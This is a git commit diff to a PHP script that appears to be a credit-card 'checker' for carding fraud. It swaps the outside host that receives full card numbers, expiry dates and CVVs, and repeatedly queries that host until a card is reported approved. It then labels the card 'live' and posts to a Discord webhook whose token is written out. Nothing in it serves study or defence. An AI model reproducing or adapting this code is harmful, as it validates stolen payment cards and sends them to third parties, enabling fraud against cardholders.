57e367d53b3a2742d7898a04c0d8056e6cc3f4ee
nanddu07 <86502569+nanddu07@users.noreply.github.com>
2021-10-24 22:51:06 -0300

    Update api.php

--- api.php
+++ api.php
@@ -26,7 +26,7 @@ function bin($cartao){
 $bin = bin($lista);
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://filhotemlkfull.com/ajaksfisahdfikda-i4235423nas-isdha732tst/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
+curl_setopt($ch, CURLOPT_URL, 'http://rickcenter.tk/chkfree/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -35,31 +35,31 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 $retorno = getStr2($r0, '</td><td>Retorno:','</td>');
 
 
-if(strpos($r0, 'PAGAMENTO APROVADO!')) {
+if(strpos($r0, 'Aprovada ✅')) {
 	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://filhotemlkfull.com/ajaksfisahdfikda-i4235423nas-isdha732tst/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
+	curl_setopt($ch, CURLOPT_URL, 'http://rickcenter.tk/chkfree/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
 	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 	$r0 = curl_exec($ch);
 	$retorno = getStr2($r0, '</td><td>Retorno:','</td>');
-	if(strpos($r0, 'PAGAMENTO APROVADO!')) {
+	if(strpos($r0, 'Aprovada ✅')) {
 		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, 'https://filhotemlkfull.com/ajaksfisahdfikda-i4235423nas-isdha732tst/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
+		curl_setopt($ch, CURLOPT_URL, 'http://rickcenter.tk/chkfree/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
 		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 		$r0 = curl_exec($ch);
 		$retorno = getStr2($r0, '</td><td>Retorno:','</td>');
-		if(strpos($r0, 'PAGAMENTO APROVADO!')) {
+		if(strpos($r0, 'Aprovada ✅')) {
 			$ch = curl_init();
-			curl_setopt($ch, CURLOPT_URL, 'https://filhotemlkfull.com/ajaksfisahdfikda-i4235423nas-isdha732tst/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
+			curl_setopt($ch, CURLOPT_URL, 'http://rickcenter.tk/chkfree/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
 			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 			$r0 = curl_exec($ch);
 			$retorno = getStr2($r0, '</td><td>Retorno:','</td>');
-			if(strpos($r0, 'PAGAMENTO APROVADO!')) {
+			if(strpos($r0, 'Aprovada ✅')) {
 				echo '<span class="badge badge-success">Livezinha</span> -> <span class="badge badge-secondary">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> -> Retorno: <span class="badge badge-warning">Transação Aprovada.</span> -> BIN: <span class="badge badge-primary">'.$bin.'</span> -> <span class="badge badge-dark">#CD7Checkers</span>';
 				$ch = curl_init();
 				curl_setopt($ch, CURLOPT_URL, "https://discord.com/api/webhooks/854848834496364556/_xtyazQ1Rk2ZungJ0O0bNry9QNJt4ctYGZpT7CQNAH3reXhzJ2wM2KeBAvhAPsm_txFg");
